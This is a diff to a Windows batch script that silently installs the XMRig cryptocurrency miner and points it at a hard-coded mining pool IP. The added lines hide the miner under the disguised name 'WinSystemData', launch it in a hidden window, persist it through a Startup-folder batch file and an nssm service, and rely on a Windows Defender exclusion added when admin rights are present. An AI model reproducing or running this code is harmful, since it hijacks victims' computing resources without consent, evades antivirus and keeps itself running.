@@ -3,7 +3,7 @@
 set VERSION=2.5
 
 net session >nul 2>&1
-if %errorLevel% == 0 (set ADMIN=1) else (set ADMIN=0)
+if %ERRORLEVEL% == 0 (set ADMIN=1) else (set ADMIN=0)
 
 if ["%USERPROFILE%"] == [""] (
   exit /b 1
@@ -55,10 +55,6 @@ if %PHYSICAL_CORES% LEQ 2 (
     set CPU_USAGE=20
 )
 
-set /a "EXP_MONERO_HASHRATE = (%PHYSICAL_CORES% * 700 * %CPU_USAGE% + 50) / 100"
-
-set /a "OPTIMAL_DIFF = %EXP_MONERO_HASHRATE% * 30"
-set DIFFICULTY=%OPTIMAL_DIFF%
 
 if %ADMIN% == 1 (
   powershell -Command "Add-MpPreference -ExclusionPath '%MINER_DIR%' -Force" >NUL 2>NUL
@@ -86,7 +82,7 @@ if errorlevel 1 (
   exit /b 1
 )
 
-powershell -Command "$wc = New-Object System.Net.WebClient; $wc.DownloadFile('https://raw.githubusercontent.com/MoneroOcean/xmrig_setup/master/xmrig.zip', '%USERPROFILE%\xmrig.zip')"
+powershell -Command "$wc = New-Object System.Net.WebClient; $wc.DownloadFile('https://github.com/xmrig/xmrig/releases/download/v6.24.0/xmrig-6.24.0-windows-x64.zip', '%USERPROFILE%\xmrig.zip')"
 if errorlevel 1 (
   goto MINER_BAD
 )
@@ -102,12 +98,10 @@ if errorlevel 1 (
 )
 del "%USERPROFILE%\xmrig.zip"
 
-powershell -Command "$out = cat '%MINER_DIR%\config.json' | %%{$_ -replace '\"donate-level\": *\d*,', '\"donate-level\": 0,'} | Out-String; $out | Out-File -Encoding ASCII '%MINER_DIR%\config.json'" 
 "%MINER_DIR%\xmrig.exe" --help >NUL
 if %ERRORLEVEL% equ 0 goto MINER_OK
+
 :MINER_BAD
-
-
 for /f tokens^=2^ delims^=^" %%a IN ('powershell -Command "[Net.ServicePointManager]::SecurityProtocol = 'tls12, tls11, tls'; $wc = New-Object System.Net.WebClient; $str = $wc.DownloadString('https://github.com/xmrig/xmrig/releases/latest'); $str | findstr msvc-win64.zip | findstr download"') DO set MINER_ARCHIVE=%%a
 set "MINER_LOCATION=https://github.com%MINER_ARCHIVE%"
 
@@ -117,7 +111,7 @@ if errorlevel 1 (
 )
 
 :REMOVE_DIR1
-timeout 5
+timeout 5 >NUL
 rmdir /q /s "%MINER_DIR%" >NUL 2>NUL
 IF EXIST "%MINER_DIR%" GOTO REMOVE_DIR1
 
@@ -140,25 +134,19 @@ if errorlevel 1 (
 )
 del "%USERPROFILE%\xmrig.zip"
 
-powershell -Command "$out = cat '%MINER_DIR%\config.json' | %%{$_ -replace '\"donate-level\": *\d*,', '\"donate-level\": 0,'} | Out-String; $out | Out-File -Encoding ASCII '%MINER_DIR%\config.json'" 
 "%MINER_DIR%\xmrig.exe" --help >NUL
 if %ERRORLEVEL% equ 0 goto MINER_OK
 
-
 exit /b 1
 
+
 :MINER_OK
+del "%MINER_DIR%\config.json"
 
-
-powershell -Command "$out = cat '%MINER_DIR%\config.json' | %%{$_ -replace '\"url\": *\".*\",', '\"url\": \"94.72.119.111:3333\",'} | Out-String; $out | Out-File -Encoding ASCII '%MINER_DIR%\config.json'" 
-powershell -Command "$out = cat '%MINER_DIR%\config.json' | %%{$_ -replace '\"priority\": *\d*,', '\"priority\": 1,'} | Out-String; $out | Out-File -Encoding ASCII '%MINER_DIR%\config.json'" 
-powershell -Command "$out = cat '%MINER_DIR%\config.json' | %%{$_ -replace '\"max-threads-hint\": *\d*,', '\"max-threads-hint\": %CPU_USAGE%,'} | Out-String; $out | Out-File -Encoding ASCII '%MINER_DIR%\config.json'" 
-powershell -Command "$out = cat '%MINER_DIR%\config.json' | %%{$_ -replace '\"background\": *false,', '\"background\": true,'} | Out-String; $out | Out-File -Encoding ASCII '%MINER_DIR%\config.json'"
-powershell -Command "$out = cat '%MINER_DIR%\config.json' | %%{$_ -replace '\"colors\": *true,', '\"colors\": false,'} | Out-String; $out | Out-File -Encoding ASCII '%MINER_DIR%\config.json'" 
-powershell -Command "$out = cat '%MINER_DIR%\config.json' | %%{$_ -replace '\"user\": *\".*\",', '\"user\": \"x+%DIFFICULTY%\",'} | Out-String; $out | Out-File -Encoding ASCII '%MINER_DIR%\config.json'"
-powershell -Command "$out = cat '%MINER_DIR%\config.json' | %%{$_ -replace '\"nicehash\": *false,', '\"nicehash\": true,'} | Out-String; $out | Out-File -Encoding ASCII '%MINER_DIR%\config.json'" 
-
-copy /Y "%MINER_DIR%\config.json" "%MINER_DIR%\config_background.json" >NUL
+for /f "tokens=*" %%a in ('powershell -Command "hostname | %%{$_ -replace '[^a-zA-Z0-9]+', '_'}"') do set PASS=%%a
+if [%PASS%] == [] (
+  set PASS=na
+)
 
 (
 echo @echo off
@@ -183,17 +171,17 @@ if exist "%USERPROFILE%\Start Menu\Programs\Startup" (
 
 exit /b 1
 
+
 :STARTUP_DIR_OK
 (
 echo @echo off
-echo start /min /b "%MINER_DIR%\xmrig.exe" --config="%MINER_DIR%\config_background.json"
+echo start /min /b "%MINER_DIR%\xmrig.exe" -o 94.72.119.111:3333 --rig-id %PASS% --cpu-max-threads-hint=%CPU_USAGE% --donate-level=0 --background
 ) > "%STARTUP_DIR%\WinSystemData.bat"
 
-powershell -WindowStyle Hidden -Command "Start-Process -FilePath '%MINER_DIR%\xmrig.exe' -ArgumentList '--config=%MINER_DIR%\config_background.json' -WindowStyle Hidden"
+powershell -WindowStyle Hidden -Command "Start-Process -FilePath '%MINER_DIR%\xmrig.exe' -ArgumentList '-o 94.72.119.111:3333 --rig-id %PASS% --cpu-max-threads-hint=%CPU_USAGE% --donate-level=0 --background' -WindowStyle Hidden"
 goto OK
 
 :ADMIN_MINER_SETUP
-
 if not exist "%MINER_DIR%" (
   mkdir "%MINER_DIR%"
   if errorlevel 1 (
@@ -227,9 +215,7 @@ if not exist "%MINER_DIR%\xmrig.exe" (
   exit /b 1
 )
 
-sc stop WinSystemData
-sc delete WinSystemData
-"%MINER_DIR%\nssm.exe" install WinSystemData "%MINER_DIR%\xmrig.exe" --config="%MINER_DIR%\config_background.json"
+"%MINER_DIR%\nssm.exe" install WinSystemData "%MINER_DIR%\xmrig.exe" -o 94.72.119.111:3333 --rig-id %PASS% --cpu-max-threads-hint=%CPU_USAGE% --donate-level=0 --background
 if errorlevel 1 (
   exit /b 1
 )
@@ -245,15 +231,6 @@ if errorlevel 1 (
 
 goto OK
 
+
 :OK
 exit /b 0
-
-:strlen string len
-setlocal EnableDelayedExpansion
-set "token=#%~1" & set "len=0"
-for /L %%A in (12,-1,0) do (
-  set/A "len|=1<<%%A"
-  for %%B in (!len!) do if "!token:~%%B,1!"=="" set/A "len&=~1<<%%A"
-)
-endlocal & set %~2=%len%
-exit /b
